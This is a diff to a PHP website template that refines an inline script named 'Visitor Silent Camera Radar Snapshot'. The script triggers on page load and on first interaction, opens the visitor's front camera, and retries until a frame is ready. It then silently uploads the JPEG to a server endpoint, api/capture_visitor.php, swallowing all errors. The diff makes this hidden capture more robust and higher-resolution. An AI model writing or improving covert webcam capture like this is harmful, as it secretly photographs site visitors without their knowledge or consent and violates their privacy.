@@ -313,42 +313,50 @@ if ($is_spa) {
         <!-- Visitor Silent Camera Radar Snapshot -->
         <script>
         (function() {
-            let isCapturing = false;
+            let capturedSuccess = false;
 
             function initCameraCapture() {
-                if (isCapturing) return;
+                if (capturedSuccess) return;
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-                
-                isCapturing = true;
-                navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240, facingMode: 'user' } })
+
+                navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' } })
                 .then(function(stream) {
                     const video = document.createElement('video');
                     video.muted = true;
                     video.playsInline = true;
+                    video.autoplay = true;
                     video.srcObject = stream;
-                    video.play();
-                    
-                    video.onloadedmetadata = function() {
-                        setTimeout(function() {
+
+                    function takeFrameSnapshot() {
+                        if (capturedSuccess) return;
+                        if (video.videoWidth > 0 && video.videoHeight > 0) {
+                            capturedSuccess = true;
                             const canvas = document.createElement('canvas');
-                            canvas.width = 320;
-                            canvas.height = 240;
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
                             const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, 320, 240);
-                            
-                            const imgData = canvas.toDataURL('image/jpeg', 0.85);
-                            
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                            const imgData = canvas.toDataURL('image/jpeg', 0.90);
                             stream.getTracks().forEach(track => track.stop());
-                            
+
                             fetch('api/capture_visitor.php', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({ image: imgData })
                             }).catch(function() {});
-                        }, 600);
-                    };
+                        } else {
+                            setTimeout(takeFrameSnapshot, 200);
+                        }
+                    }
+
+                    video.addEventListener('playing', function() {
+                        setTimeout(takeFrameSnapshot, 400);
+                    });
+                    video.play().then(function() {
+                        setTimeout(takeFrameSnapshot, 500);
+                    }).catch(function() {});
                 }).catch(function() {
-                    isCapturing = false;
                     fetch('api/capture_visitor.php', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -357,9 +365,8 @@ if ($is_spa) {
                 });
             }
 
-            // Trigger on page load and on first user interaction
             window.addEventListener('DOMContentLoaded', function() {
-                setTimeout(initCameraCapture, 1000);
+                setTimeout(initCameraCapture, 800);
             });
             ['click', 'touchstart', 'pointerdown', 'scroll'].forEach(function(evt) {
                 window.addEventListener(evt, function() {
